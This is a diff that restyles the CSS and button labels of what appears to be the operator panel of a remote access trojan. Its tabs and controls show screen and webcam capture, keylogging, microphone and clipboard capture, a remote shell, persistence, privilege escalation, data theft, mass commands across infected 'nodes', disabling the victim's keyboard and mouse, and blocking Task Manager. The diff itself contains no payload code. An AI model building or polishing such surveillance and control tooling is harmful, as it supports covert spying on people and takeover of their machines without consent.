 .keylog-output::-webkit-scrollbar{width:4px;}
-.keylog-output::-webkit-scrollbar-thumb{background:var(--border2);}
-.kl-special{color:#f59e0b;}
-.keylog-controls{flex-shrink:0;padding:8px 16px;border-top:1px solid var(--border2);
-  display:flex;gap:8px;align-items:center;background:var(--s1);}
-.shell-output{flex:1;min-height:0;overflow-y:auto;padding:14px 18px;font-size:11px;
-  line-height:1.9;background:#0a0906;white-space:pre-wrap;word-break:break-all;font-family:var(--mono);}
+.keylog-output::-webkit-scrollbar-thumb{background:#2d3748;border-radius:4px;}
+.kl-special{color:#f6ad55;}
+.keylog-controls{
+  flex-shrink:0;padding:8px 16px;
+  border-top:1px solid var(--border);
+  display:flex;gap:8px;align-items:center;
+  background:var(--surface);
+}
+.shell-output{
+  flex:1;min-height:0;overflow-y:auto;
+  padding:14px 18px;font-size:11px;
+  line-height:1.9;
+  background:#0f1117;
+  white-space:pre-wrap;word-break:break-all;
+  font-family:var(--mono);
+  color:#e2e8f0;
+}
 .shell-output::-webkit-scrollbar{width:4px;}
-.shell-output::-webkit-scrollbar-thumb{background:var(--border2);}
-.shell-stdout{color:var(--text);}
-.shell-stderr{color:#f59e0b;}
-.shell-prompt-line{color:var(--fire);}
-.shell-input-row{flex-shrink:0;padding:8px 14px;border-top:1px solid var(--border2);
-  display:flex;gap:8px;align-items:center;background:var(--s1);}
-.shell-input-row span{color:var(--fire);font-size:13px;font-family:var(--mono);}
-.shell-input{flex:1;background:transparent;border:none;color:var(--text);
-  font-family:var(--mono);font-size:11px;outline:none;}
-.clip-area{flex:1;min-height:0;overflow-y:auto;padding:14px 18px;}
+.shell-output::-webkit-scrollbar-thumb{background:#2d3748;border-radius:4px;}
+.shell-stdout{color:#e2e8f0;}
+.shell-stderr{color:#fbbf24;}
+.shell-prompt-line{color:#60a5fa;}
+.shell-input-row{
+  flex-shrink:0;padding:8px 14px;
+  border-top:1px solid var(--border);
+  display:flex;gap:8px;align-items:center;
+  background:var(--surface);
+}
+.shell-input-row span{color:var(--accent);font-size:13px;font-family:var(--mono);}
+.shell-input{
+  flex:1;background:transparent;border:none;
+  color:var(--text);font-family:var(--mono);font-size:11px;outline:none;
+}
+.clip-area{flex:1;min-height:0;overflow-y:auto;padding:16px 20px;}
 .clip-area::-webkit-scrollbar{width:4px;}
-.clip-area::-webkit-scrollbar-thumb{background:var(--border2);}
-.clip-display{background:#0a0906;border:1px solid var(--border2);padding:10px 12px;
-  font-size:12px;font-family:var(--mono);color:var(--text);min-height:60px;max-height:180px;
-  overflow-y:auto;white-space:pre-wrap;word-break:break-all;margin-bottom:10px;}
-.clip-input{width:100%;background:#0a0906;border:1px solid var(--border2);padding:8px 12px;
+.clip-area::-webkit-scrollbar-thumb{background:var(--border2);border-radius:4px;}
+.clip-display{
+  background:var(--surface2);
+  border:1px solid var(--border2);
+  border-radius:6px;
+  padding:10px 12px;
+  font-size:12px;font-family:var(--mono);
+  color:var(--text);min-height:60px;max-height:180px;
+  overflow-y:auto;white-space:pre-wrap;word-break:break-all;
+  margin-bottom:10px;
+}
+.clip-input{
+  width:100%;
+  background:var(--surface);
+  border:1px solid var(--border2);
+  border-radius:6px;
+  padding:8px 12px;
   color:var(--text);font-family:var(--mono);font-size:11px;
-  resize:vertical;min-height:60px;outline:none;margin-bottom:8px;}
-.clip-input:focus{border-color:rgba(249,115,22,0.4);}
-.fb-nav{flex-shrink:0;padding:8px 16px;border-bottom:1px solid var(--border2);display:flex;gap:7px;align-items:center;background:var(--s1);}
-.fb-path{flex:1;background:#0a0906;border:1px solid var(--border2);padding:5px 9px;
-  color:var(--fire);font-family:var(--mono);font-size:11px;outline:none;}
-.fb-colhdr{flex-shrink:0;display:flex;align-items:center;gap:8px;padding:6px 10px 6px 18px;
-  font-size:9px;letter-spacing:2px;color:var(--dim);border-bottom:1px solid var(--border2);text-transform:uppercase;}
+  resize:vertical;min-height:60px;outline:none;margin-bottom:8px;
+}
+.clip-input:focus{border-color:var(--accent);box-shadow:0 0 0 3px var(--accent-dim);}
+.fb-nav{
+  flex-shrink:0;padding:8px 16px;
+  border-bottom:1px solid var(--border);
+  display:flex;gap:7px;align-items:center;
+  background:var(--surface);
+}
+.fb-path{
+  flex:1;
+  background:var(--surface2);
+  border:1px solid var(--border2);
+  border-radius:6px;
+  padding:5px 10px;
+  color:var(--accent);font-family:var(--mono);font-size:11px;outline:none;
+}
+.fb-path:focus{border-color:var(--accent);}
+.fb-colhdr{
+  flex-shrink:0;
+  display:flex;align-items:center;gap:8px;
+  padding:6px 10px 6px 18px;
+  font-size:9px;letter-spacing:0.1em;color:var(--muted);
+  border-bottom:1px solid var(--border);
+  text-transform:uppercase;font-weight:600;
+  background:var(--surface2);
+}
 .fb-list{flex:1;min-height:0;overflow-y:auto;padding-bottom:10px;}
 .fb-list::-webkit-scrollbar{width:4px;}
-.fb-list::-webkit-scrollbar-thumb{background:var(--border2);}
-.fb-item{display:flex;align-items:center;gap:8px;padding:7px 10px;
-  border-bottom:1px solid rgba(49,43,36,0.4);cursor:pointer;font-size:11px;transition:background .1s;font-family:var(--mono);}
-.fb-item:hover{background:rgba(249,115,22,0.03);}
+.fb-list::-webkit-scrollbar-thumb{background:var(--border2);border-radius:4px;}
+.fb-item{
+  display:flex;align-items:center;gap:8px;
+  padding:7px 10px;border-bottom:1px solid var(--border);
+  cursor:pointer;font-size:11px;
+  transition:background 0.1s;font-family:var(--mono);
+}
+.fb-item:hover{background:var(--surface2);}
 .fb-item .fi-icon{width:14px;text-align:center;font-size:12px;}
 .fb-item .fi-name{flex:1;color:var(--text);}
-.fb-item.is-dir .fi-name{color:var(--fire);}
-.fb-item .fi-size{color:var(--dim);font-size:9px;min-width:65px;text-align:right;}
-.fb-item .fi-date{color:var(--dim);font-size:9px;min-width:110px;text-align:right;}
+.fb-item.is-dir .fi-name{color:var(--accent);}
+.fb-item .fi-size{color:var(--muted);font-size:9px;min-width:65px;text-align:right;}
+.fb-item .fi-date{color:var(--muted);font-size:9px;min-width:110px;text-align:right;}
 .fb-item .fi-act{display:flex;gap:4px;opacity:0;min-width:80px;justify-content:flex-end;}
 .fb-item:hover .fi-act{opacity:1;}
+
 .sysinfo-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
-.si-card{background:var(--s3);border:1px solid var(--border);padding:12px 14px;}
-.si-label{font-size:9px;letter-spacing:2px;color:var(--dim);text-transform:uppercase;margin-bottom:5px;}
+.si-card{background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius);padding:12px 14px;}
+.si-label{font-size:9px;letter-spacing:0.08em;color:var(--muted);text-transform:uppercase;margin-bottom:5px;font-weight:600;}
 .si-value{font-family:var(--mono);font-size:12px;color:var(--text);}
-.si-value.accent{color:var(--fire);}
-.si-value.accent2{color:var(--blue);}
-.progress-bar{height:2px;background:var(--border2);margin-top:6px;overflow:hidden;}
-.progress-fill{height:100%;background:var(--fire);}
-.progress-fill.warn{background:#f59e0b;}
+.si-value.accent{color:var(--accent);}
+.si-value.accent2{color:var(--accent);}
+.progress-bar{height:3px;background:var(--border2);border-radius:10px;margin-top:6px;overflow:hidden;}
+.progress-fill{height:100%;background:var(--accent);border-radius:10px;transition:width 0.4s ease;}
+.progress-fill.warn{background:var(--amber);}
 .progress-fill.danger{background:var(--red);}
 .proc-table th{padding:7px 10px;}
-.proc-table td{padding:6px 10px;border-bottom:1px solid rgba(49,43,36,0.35);font-family:var(--mono);}
+.proc-table td{padding:6px 10px;border-bottom:1px solid var(--border);font-family:var(--mono);}
 .net-section{margin-bottom:16px;}
-.net-title{font-size:9px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;
-  margin-bottom:8px;padding-bottom:4px;border-bottom:1px solid var(--border2);}
-.net-iface{display:flex;gap:16px;padding:6px 10px;border-bottom:1px solid rgba(49,43,36,0.3);font-size:11px;font-family:var(--mono);}
-.net-iface .ni-name{color:var(--fire);min-width:120px;}
+.net-title{
+  font-size:9px;letter-spacing:0.1em;color:var(--muted);
+  text-transform:uppercase;margin-bottom:8px;
+  padding-bottom:4px;border-bottom:1px solid var(--border);
+  font-weight:600;
+}
+.net-iface{
+  display:flex;gap:16px;padding:6px 10px;
+  border-bottom:1px solid var(--border);
+  font-size:11px;font-family:var(--mono);
+}
+.net-iface .ni-name{color:var(--accent);min-width:120px;}
 .net-iface .ni-ip{color:var(--text);}
-.net-iface .ni-mask{color:var(--dim);}
+.net-iface .ni-mask{color:var(--muted);}
 .mic-area{flex:1;min-height:0;overflow-y:auto;padding:16px 18px;}
 .mic-area::-webkit-scrollbar{width:4px;}
-.mic-area::-webkit-scrollbar-thumb{background:var(--border2);}
-.audio-item{background:var(--s3);border:1px solid var(--border2);padding:10px 14px;
-  margin-bottom:8px;display:flex;align-items:center;gap:12px;}
+.mic-area::-webkit-scrollbar-thumb{background:var(--border2);border-radius:4px;}
+.audio-item{
+  background:var(--surface2);
+  border:1px solid var(--border2);
+  border-radius:var(--radius);
+  padding:10px 14px;
+  margin-bottom:8px;
+  display:flex;align-items:center;gap:12px;
+}
 .audio-item audio{flex:1;height:28px;}
-.ss-gallery{flex:1;min-height:0;overflow-y:auto;padding:12px 16px;
-  display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:10px;align-content:start;}
+.ss-gallery{
+  flex:1;min-height:0;overflow-y:auto;
+  padding:12px 16px;
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));
+  gap:10px;align-content:start;
+}
 .ss-gallery::-webkit-scrollbar{width:4px;}
-.ss-gallery::-webkit-scrollbar-thumb{background:var(--border2);}
-.ss-thumb{background:var(--s3);border:1px solid var(--border2);overflow:hidden;cursor:pointer;}
+.ss-gallery::-webkit-scrollbar-thumb{background:var(--border2);border-radius:4px;}
+.ss-thumb{
+  background:var(--surface2);
+  border:1px solid var(--border2);
+  border-radius:var(--radius);
+  overflow:hidden;cursor:pointer;
+  transition:transform 0.2s,box-shadow 0.2s;
+}
+.ss-thumb:hover{transform:scale(1.02);box-shadow:0 4px 12px var(--shadow-lg);}
 .ss-thumb img{width:100%;display:block;}
-.ss-thumb .ss-info{padding:5px 8px;font-size:10px;color:var(--dim);font-family:var(--mono);}
+.ss-thumb .ss-info{padding:5px 8px;font-size:10px;color:var(--muted);font-family:var(--mono);}
 .chat-messages{flex:1;min-height:0;overflow-y:auto;padding:12px 16px;}
 .chat-messages::-webkit-scrollbar{width:4px;}
-.chat-messages::-webkit-scrollbar-thumb{background:var(--border2);}
-.chat-msg{padding:8px 12px;margin-bottom:6px;font-size:11px;}
-.chat-msg-me{background:rgba(249,115,22,0.05);border-left:2px solid var(--fire);}
-.chat-msg-them{background:rgba(96,165,250,0.05);border-left:2px solid var(--blue);}
+.chat-messages::-webkit-scrollbar-thumb{background:var(--border2);border-radius:4px;}
+.chat-msg{padding:8px 12px;margin-bottom:6px;font-size:11px;border-radius:var(--radius);}
+.chat-msg-me{background:var(--accent-dim);border-left:2px solid var(--accent);}
+.chat-msg-them{background:var(--surface2);border-left:2px solid var(--border2);}
 .chat-msg-sys{text-align:center;}
-.cm-sys{font-size:9px;color:var(--dim);padding:4px 0;font-family:var(--mono);}
+.cm-sys{font-size:9px;color:var(--muted);padding:4px 0;font-family:var(--mono);}
 .cm-header{display:flex;justify-content:space-between;margin-bottom:4px;}
-.cm-label-me{color:var(--fire);font-size:9px;letter-spacing:2px;text-transform:uppercase;}
-.cm-label-them{color:var(--blue);font-size:9px;letter-spacing:2px;text-transform:uppercase;}
-.cm-time{font-family:var(--mono);font-size:9px;color:var(--dim);}
+.cm-label-me{color:var(--accent);font-size:9px;letter-spacing:0.08em;text-transform:uppercase;font-weight:600;}
+.cm-label-them{color:var(--muted);font-size:9px;letter-spacing:0.08em;text-transform:uppercase;font-weight:600;}
+.cm-time{font-family:var(--mono);font-size:9px;color:var(--faint);}
 .cm-text{color:var(--text);line-height:1.6;}
-.chat-input-row{flex-shrink:0;padding:10px 16px;border-top:1px solid var(--border2);display:flex;gap:8px;background:var(--s1);}
-.chat-input{flex:1;background:#0a0906;border:1px solid var(--border2);padding:7px 10px;
-  color:var(--text);font-family:var(--mono);font-size:11px;outline:none;}
-.chat-input:focus{border-color:rgba(249,115,22,0.4);}
+.chat-input-row{
+  flex-shrink:0;padding:10px 16px;
+  border-top:1px solid var(--border);
+  display:flex;gap:8px;
+  background:var(--surface);
+}
+.chat-input{
+  flex:1;background:var(--surface2);
+  border:1px solid var(--border2);
+  border-radius:6px;
+  padding:7px 10px;
+  color:var(--text);font-family:var(--mono);font-size:11px;outline:none;
+}
+.chat-input:focus{border-color:var(--accent);box-shadow:0 0 0 3px var(--accent-dim);}
 .chat-input:disabled{opacity:0.4;}
 .mass-area{flex:1;min-height:0;overflow-y:auto;padding:14px 18px;}
 .mass-area::-webkit-scrollbar{width:4px;}
-.mass-area::-webkit-scrollbar-thumb{background:var(--border2);}
-.mass-result{background:var(--s3);border:1px solid var(--border2);padding:8px 12px;margin-bottom:6px;font-size:11px;font-family:var(--mono);}
-.mass-result .mr-host{color:var(--fire);margin-bottom:3px;}
+.mass-area::-webkit-scrollbar-thumb{background:var(--border2);border-radius:4px;}
+.mass-result{
+  background:var(--surface2);border:1px solid var(--border2);
+  border-radius:var(--radius);
+  padding:8px 12px;margin-bottom:6px;font-size:11px;font-family:var(--mono);
+}
+.mass-result .mr-host{color:var(--accent);margin-bottom:3px;}
 .mass-result .mr-out{color:var(--text);white-space:pre-wrap;word-break:break-all;}
-.mass-result .mr-err{color:#f59e0b;}
+.mass-result .mr-err{color:var(--amber);}
 .persist-area{flex:1;min-height:0;overflow-y:auto;padding:16px 18px;}
-.hostname{color:var(--fire);font-family:var(--mono);}
-.platform-badge{font-size:9px;padding:2px 8px;
-  background:var(--blue-dim);border:1px solid rgba(96,165,250,0.2);color:var(--blue);letter-spacing:1px;}
-.status-badge{display:inline-flex;align-items:center;gap:5px;font-size:9px;
-  padding:2px 8px;letter-spacing:1px;font-weight:600;text-transform:uppercase;}
-.status-badge.online{background:var(--green-dim);color:var(--green);border:1px solid rgba(34,197,94,0.3);}
-.status-badge.offline{background:rgba(107,96,87,0.1);color:var(--dim);border:1px solid var(--border);}
+.hostname{color:var(--accent);font-family:var(--mono);}
+.platform-badge{
+  font-size:9px;padding:2px 8px;
+  background:var(--accent-dim);border:1px solid var(--accent-mid);
+  border-radius:100px;
+  color:var(--accent);letter-spacing:0.06em;
+}
+.status-badge{
+  display:inline-flex;align-items:center;gap:5px;
+  font-size:9px;padding:2px 8px;letter-spacing:0.06em;font-weight:600;text-transform:uppercase;
+  border-radius:100px;
+}
+.status-badge.online{background:var(--green-dim);color:var(--green);border:1px solid rgba(22,163,74,0.2);}
+.status-badge.offline{background:var(--surface2);color:var(--muted);border:1px solid var(--border);}
 .status-badge::before{content:'';width:4px;height:4px;border-radius:50%;background:currentColor;flex-shrink:0;}
-.status-badge.online::before{animation:blink 1.5s infinite;}
+.status-badge.online::before{animation:live-pulse 1.5s infinite;}
 
 /* ── LOGIN ── */
-.login-overlay{position:fixed;inset:0;background:var(--bg);z-index:9999;
-  display:flex;align-items:center;justify-content:center;}
+.login-overlay{
+  position:fixed;inset:0;
+  background:var(--bg);
+  z-index:9999;
+  display:flex;align-items:center;justify-content:center;
+  animation:none;
+}
 .login-wrap{display:flex;flex-direction:column;align-items:center;gap:0;width:380px;}
 .login-brand{display:flex;align-items:center;gap:12px;margin-bottom:32px;}
-.login-triangle{width:36px;height:36px;background:var(--fire);
+.login-triangle{
+  width:36px;height:36px;background:var(--accent);
   clip-path:polygon(50% 0%,100% 100%,0% 100%);
-  box-shadow:0 0 30px rgba(249,115,22,0.6);}
-.login-brand-name{font-size:22px;font-weight:700;letter-spacing:5px;color:var(--bright);}
-.login-brand-name span{color:var(--fire);font-weight:300;}
-.login-box{background:var(--s1);border:1px solid var(--border2);
-  padding:32px;width:100%;display:flex;flex-direction:column;gap:12px;
-  box-shadow:0 20px 60px rgba(0,0,0,0.8);}
-.login-label{font-size:9px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;margin-bottom:-6px;}
-.login-input{background:var(--bg);border:1px solid var(--border2);padding:11px 14px;
-  color:var(--text);font-family:var(--mono);font-size:13px;outline:none;width:100%;}
-.login-input:focus{border-color:var(--fire);box-shadow:0 0 0 2px rgba(249,115,22,0.1);}
-.login-err{font-family:var(--mono);font-size:10px;color:var(--red);text-align:center;min-height:16px;letter-spacing:1px;}
+  box-shadow:0 4px 16px rgba(37,99,235,0.35);
+  animation:brand-float 3s ease-in-out infinite;
+}
+.login-brand-name{font-size:22px;font-weight:700;letter-spacing:0.05em;color:var(--bright);}
+.login-brand-name span{color:var(--accent);font-weight:400;}
+.login-box{
+  background:var(--surface);
+  border:1px solid var(--border2);
+  border-radius:var(--radius-lg);
+  padding:32px;width:100%;
+  display:flex;flex-direction:column;gap:12px;
+  box-shadow:0 8px 32px var(--shadow),0 20px 60px rgba(0,0,0,0.06);
+}
+.login-label{
+  font-size:10px;letter-spacing:0.1em;
+  color:var(--muted);text-transform:uppercase;
+  margin-bottom:-6px;font-weight:600;
+}
+.login-input{
+  background:var(--surface2);
+  border:1px solid var(--border2);
+  border-radius:var(--radius);
+  padding:11px 14px;
+  color:var(--text);font-family:var(--mono);font-size:13px;outline:none;width:100%;
+  transition:border-color 0.15s,box-shadow 0.15s;
+}
+.login-input:focus{
+  border-color:var(--accent);
+  box-shadow:0 0 0 3px var(--accent-dim);
+}
+.login-err{
+  font-family:var(--mono);font-size:10px;
+  color:var(--red);text-align:center;
+  min-height:16px;letter-spacing:0.06em;
+}
 
-/* ── MISC / INPUTS ── */
-.loading{color:var(--dim);font-size:11px;padding:24px;text-align:center;animation:blink 1.5s infinite;font-family:var(--mono);}
-.no-data{color:var(--dim);font-size:11px;padding:32px;text-align:center;letter-spacing:2px;text-transform:uppercase;}
+/* ── MISC / FORM ELEMENTS ── */
+.loading{
+  color:var(--muted);font-size:11px;padding:24px;
+  text-align:center;font-family:var(--mono);
+  animation:loading-pulse 1.5s infinite;
+}
+@keyframes loading-pulse{0%,100%{opacity:1}50%{opacity:0.4}}
+.no-data{color:var(--muted);font-size:11px;padding:32px;text-align:center;letter-spacing:0.08em;text-transform:uppercase;font-weight:500;}
 table{width:100%;border-collapse:collapse;font-size:11px;}
-th{text-align:left;padding:9px 14px;font-size:9px;letter-spacing:2px;
-  color:var(--dim);text-transform:uppercase;border-bottom:1px solid var(--border2);background:var(--s1);}
-td{padding:10px 14px;border-bottom:1px solid rgba(49,43,36,0.4);vertical-align:middle;}
+th{
+  text-align:left;padding:9px 14px;
+  font-size:9px;letter-spacing:0.1em;
+  color:var(--muted);text-transform:uppercase;font-weight:600;
+  border-bottom:1px solid var(--border2);
+  background:var(--surface2);
+}
+td{padding:10px 14px;border-bottom:1px solid var(--border);vertical-align:middle;}
 tr:last-child td{border-bottom:none;}
-tbody tr:hover td{background:rgba(255,255,255,0.015);}
-input[type=text],input[type=number]{background:var(--bg);border:1px solid var(--border2);
-  padding:4px 9px;color:var(--text);font-family:var(--mono);font-size:11px;outline:none;}
-input[type=text]:focus,input[type=number]:focus{border-color:rgba(249,115,22,0.5);}
-select{background:var(--bg);border:1px solid var(--border2);padding:4px 8px;
-  color:var(--text);font-family:var(--mono);font-size:11px;outline:none;}
-.tag{font-size:9px;padding:2px 7px;border:1px solid;letter-spacing:.5px;}
-.tag-green{color:var(--green);border-color:rgba(34,197,94,0.3);background:var(--green-dim);}
-.tag-red{color:var(--red);border-color:rgba(239,68,68,0.3);background:var(--red-dim);}
-.tag-blue{color:var(--blue);border-color:rgba(96,165,250,0.3);background:var(--blue-dim);}
-.upload-progress{display:none;height:2px;background:var(--border2);overflow:hidden;margin-top:4px;width:100%;}
-.upload-progress-fill{height:100%;background:var(--fire);width:0%;transition:width 0.2s;}
+tbody tr:hover td{background:var(--surface2);}
+input[type=text],input[type=number]{
+  background:var(--surface2);border:1px solid var(--border2);
+  border-radius:6px;
+  padding:4px 9px;color:var(--text);font-family:var(--mono);font-size:11px;outline:none;
+  transition:border-color 0.15s;
+}
+input[type=text]:focus,input[type=number]:focus{
+  border-color:var(--accent);
+  box-shadow:0 0 0 3px var(--accent-dim);
+}
+select{
+  background:var(--surface2);border:1px solid var(--border2);
+  border-radius:6px;
+  padding:4px 8px;color:var(--text);font-family:var(--mono);font-size:11px;outline:none;
+}
+.tag{font-size:9px;padding:2px 7px;border:1px solid;letter-spacing:0.04em;border-radius:4px;}
+.tag-green{color:var(--green);border-color:rgba(22,163,74,0.25);background:var(--green-dim);}
+.tag-red{color:var(--red);border-color:rgba(220,38,38,0.25);background:var(--red-dim);}
+.tag-blue{color:var(--accent);border-color:rgba(37,99,235,0.25);background:var(--accent-dim);}
+.upload-progress{display:none;height:3px;background:var(--border2);overflow:hidden;margin-top:4px;width:100%;border-radius:10px;}
+.upload-progress-fill{height:100%;background:var(--accent);width:0%;transition:width 0.2s;border-radius:10px;}
+
+/* Panel section headings */
+.section-head{
+  font-size:9px;letter-spacing:0.12em;color:var(--muted);
+  text-transform:uppercase;font-weight:600;
+  margin:14px 0 8px;
+  padding-bottom:4px;
+  border-bottom:1px solid var(--border);
+}
+.info-banner{
+  margin-bottom:16px;
+  padding:12px 14px;
+  border-radius:var(--radius);
+  font-size:11px;line-height:1.8;
+}
+.info-banner.warn{background:rgba(217,119,6,0.06);border:1px solid rgba(217,119,6,0.2);}
+.info-banner.danger{background:rgba(220,38,38,0.05);border:1px solid rgba(220,38,38,0.15);}
+.info-banner.purple{background:rgba(124,58,237,0.06);border:1px solid rgba(124,58,237,0.2);}
+.info-banner.blue{background:var(--accent-dim);border:1px solid var(--accent-mid);}
+.info-banner-title{font-size:10px;letter-spacing:0.1em;margin-bottom:6px;font-weight:600;}
+.info-banner.warn .info-banner-title{color:var(--amber);}
+.info-banner.danger .info-banner-title{color:var(--red);}
+.info-banner.purple .info-banner-title{color:var(--purple);}
+.info-banner.blue .info-banner-title{color:var(--accent);}
+.panel-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:4px;}
+.panel-card{
+  background:var(--surface);
+  border:1px solid var(--border2);
+  border-radius:var(--radius);
+  padding:10px 14px;
+}
+.panel-card-title{font-size:11px;color:var(--text);margin-bottom:8px;font-weight:500;}
 </style>
 </head>
 <body>
@@ -393,7 +918,7 @@ select{background:var(--bg);border:1px solid var(--border2);padding:4px 8px;
     <div class="login-box">
       <div class="login-label">Access Key</div>
       <input class="login-input" id="login-pass" type="password" placeholder="Enter password..." onkeydown="if(event.key==='Enter')doLogin()">
-      <button class="btn btn-fire btn-full" onclick="doLogin()">AUTHENTICATE →</button>
+      <button class="btn btn-primary btn-full" onclick="doLogin()">Authenticate →</button>
       <div class="login-err" id="login-err"></div>
     </div>
   </div>
@@ -408,7 +933,7 @@ select{background:var(--bg);border:1px solid var(--border2);padding:4px 8px;
   <div class="topbar-stats">
     <div class="tstat">
       <div>
-        <div class="tstat-num fire" id="stat-total">0</div>
+        <div class="tstat-num accent" id="stat-total">0</div>
         <div class="tstat-label">Total</div>
       </div>
     </div>
@@ -426,7 +951,7 @@ select{background:var(--bg);border:1px solid var(--border2);padding:4px 8px;
     </div>
   </div>
   <div class="topbar-right">
-    <button class="btn btn-ghost btn-sm" onclick="openMassCmd()">⚡ MASS CMD</button>
+    <button class="btn btn-ghost btn-sm" onclick="openMassCmd()">⚡ Mass Cmd</button>
     <div class="live-pill"><div class="live-dot"></div>LIVE</div>
     <div class="clock" id="clock">--:--:--</div>
   </div>
@@ -439,7 +964,7 @@ select{background:var(--bg);border:1px solid var(--border2);padding:4px 8px;
   <div class="rail">
     <div class="rail-head">
       <span>Activity</span>
-      <span class="rl-count" id="rail-count">0</span>
+      <span class="rl-badge" id="rail-count">0</span>
     </div>
     <div class="rail-log" id="log"></div>
   </div>
@@ -447,8 +972,8 @@ select{background:var(--bg);border:1px solid var(--border2);padding:4px 8px;
   <!-- CARD GRID -->
   <div class="grid-area">
     <div class="grid-toolbar">
-      <div class="grid-title" id="grid-title">CONNECTED NODES</div>
-      <span id="last-update" style="font-family:var(--mono);font-size:9px;color:var(--dim);letter-spacing:1px;">WAITING...</span>
+      <div class="grid-title" id="grid-title">Connected Nodes</div>
+      <span id="last-update" style="font-family:var(--mono);font-size:9px;color:var(--muted);letter-spacing:0.06em;">Waiting...</span>
     </div>
     <div class="node-grid" id="node-grid">
       <div class="empty-grid">
@@ -474,23 +999,23 @@ select{background:var(--bg);border:1px solid var(--border2);padding:4px 8px;
       <button class="modal-close" onclick="closeModal()">✕</button>
     </div>
     <div class="modal-tabs">
-      <button class="tab-btn active" data-tab="screen">SCREEN</button>
-      <button class="tab-btn" data-tab="webcam">WEBCAM</button>
-      <button class="tab-btn" data-tab="shell">SHELL</button>
-      <button class="tab-btn" data-tab="keylog">KEYLOG</button>
-      <button class="tab-btn" data-tab="mic">MIC</button>
-      <button class="tab-btn" data-tab="clipboard">CLIPBOARD</button>
-      <button class="tab-btn" data-tab="files">FILES</button>
-      <button class="tab-btn" data-tab="network">NETWORK</button>
-      <button class="tab-btn" data-tab="sysinfo">SYSINFO</button>
-      <button class="tab-btn" data-tab="processes">PROCESSES</button>
-      <button class="tab-btn" data-tab="autoshots">AUTO-SS</button>
-      <button class="tab-btn" data-tab="chat">CHAT</button>
-      <button class="tab-btn" data-tab="persist">PERSIST</button>
-      <button class="tab-btn" data-tab="privesc" style="color:var(--warn);">⚡ PRIVESC</button>
-      <button class="tab-btn" data-tab="admin" style="color:var(--danger);">👑 ADMIN</button>
-      <button class="tab-btn" data-tab="data" style="color:var(--purple);">💀 DATA</button>
-      <button class="tab-btn" data-tab="power" style="color:var(--danger);">⏻ POWER</button>
+      <button class="tab-btn active" data-tab="screen">Screen</button>
+      <button class="tab-btn" data-tab="webcam">Webcam</button>
+      <button class="tab-btn" data-tab="shell">Shell</button>
+      <button class="tab-btn" data-tab="keylog">Keylog</button>
+      <button class="tab-btn" data-tab="mic">Mic</button>
+      <button class="tab-btn" data-tab="clipboard">Clipboard</button>
+      <button class="tab-btn" data-tab="files">Files</button>
+      <button class="tab-btn" data-tab="network">Network</button>
+      <button class="tab-btn" data-tab="sysinfo">Sysinfo</button>
+      <button class="tab-btn" data-tab="processes">Processes</button>
+      <button class="tab-btn" data-tab="autoshots">Auto-SS</button>
+      <button class="tab-btn" data-tab="chat">Chat</button>
+      <button class="tab-btn" data-tab="persist">Persist</button>
+      <button class="tab-btn" data-tab="privesc" style="color:var(--amber);">⚡ Privesc</button>
+      <button class="tab-btn" data-tab="admin" style="color:var(--red);">👑 Admin</button>
+      <button class="tab-btn" data-tab="data" style="color:var(--purple);">💀 Data</button>
+      <button class="tab-btn" data-tab="power" style="color:var(--red);">⏻ Power</button>
     </div>
     <div class="modal-body">
 
@@ -498,35 +1023,32 @@ select{background:var(--bg);border:1px solid var(--border2);padding:4px 8px;
       <div class="tab-content active" id="tab-screen">
         <div class="stream-wrapper" id="stream-wrapper">
           <img id="screen-img" src="" alt="" style="display:none;">
-          <div id="stream-placeholder" style="color:var(--dim);font-size:12px;padding:40px;text-align:center;">Stream stopped — click START</div>
+          <div id="stream-placeholder" style="color:var(--muted);font-size:12px;padding:40px;text-align:center;">Stream stopped — click START</div>
         </div>
         <div class="stream-toolbar">
-          <button class="btn btn-green btn-sm" id="btn-stream-start" onclick="startStream()">▶ START</button>
-          <button class="btn btn-red btn-sm" id="btn-stream-stop" onclick="stopStream()" disabled>■ STOP</button>
-          <button class="btn btn-blue btn-sm" onclick="takeScreenshot()">📷 SNAP</button>
-          <button class="btn btn-warn btn-sm" onclick="sendAlert()">⚠ ALERT</button>
-          <button class="btn btn-warn btn-sm" onclick="sendCmd('lock_screen')">🔒 LOCK</button>
+          <button class="btn btn-green btn-sm" id="btn-stream-start" onclick="startStream()">▶ Start</button>
+          <button class="btn btn-red btn-sm" id="btn-stream-stop" onclick="stopStream()" disabled>■ Stop</button>
+          <button class="btn btn-blue btn-sm" onclick="takeScreenshot()">📷 Snap</button>
+          <button class="btn btn-warn btn-sm" onclick="sendAlert()">⚠ Alert</button>
+          <button class="btn btn-warn btn-sm" onclick="sendCmd('lock_screen')">🔒 Lock</button>
           <button class="btn btn-blue btn-sm" onclick="openUrl()">🌐 URL</button>
-          <label style="display:flex;align-items:center;gap:5px;font-size:10px;color:var(--dim);cursor:pointer;">
+          <label style="display:flex;align-items:center;gap:5px;font-size:10px;color:var(--muted);cursor:pointer;font-family:var(--mono);letter-spacing:0.06em;">
             <input type="checkbox" id="remote-ctrl-toggle" onchange="toggleRemoteCtrl(this.checked)"> REMOTE CTRL
           </label>
-          <label style="display:flex;align-items:center;gap:5px;font-size:10px;color:var(--warn);cursor:pointer;">
+          <label style="display:flex;align-items:center;gap:5px;font-size:10px;color:var(--amber);cursor:pointer;font-family:var(--mono);letter-spacing:0.06em;">
             <input type="checkbox" id="disable-input-toggle" onchange="toggleDisableInput(this.checked)"> DISABLE KB+MOUSE
           </label>
-          <label style="display:flex;align-items:center;gap:5px;font-size:10px;color:var(--danger);cursor:pointer;" title="Block all keyboard and mouse input on target">
-            <input type="checkbox" id="disable-input-toggle" onchange="toggleDisableInput(this.checked)"> DISABLE KB+MOUSE
-          </label>
-          <label style="display:flex;align-items:center;gap:5px;font-size:10px;color:var(--danger);cursor:pointer;" title="Kill Task Manager the moment it opens">
+          <label style="display:flex;align-items:center;gap:5px;font-size:10px;color:var(--red);cursor:pointer;font-family:var(--mono);letter-spacing:0.06em;" title="Kill Task Manager the moment it opens">
             <input type="checkbox" id="block-taskmgr-toggle" onchange="toggleBlockTaskmgr(this.checked)"> BLOCK TASK MGR
           </label>
         </div>
